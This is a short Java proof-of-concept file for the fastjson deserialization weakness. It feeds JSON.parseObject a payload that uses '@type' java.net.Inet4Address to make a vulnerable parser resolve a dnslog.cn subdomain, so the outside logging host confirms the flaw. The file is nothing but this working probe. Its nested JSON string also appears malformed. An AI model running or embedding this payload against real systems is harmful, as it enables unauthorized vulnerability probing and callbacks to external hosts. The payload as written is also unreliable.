package tmp;

import com.alibaba.fastjson.JSON;

public class fastjvul {
    public static void main(String[] args) {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc03 = "{\"aaa\": \"{\"@type\":\"java.net.Inet4Address\",\"val\":\"11.hb4r0s.dnslog.cn\"}\"}";
        JSON.parseObject(poc03);
    }
}
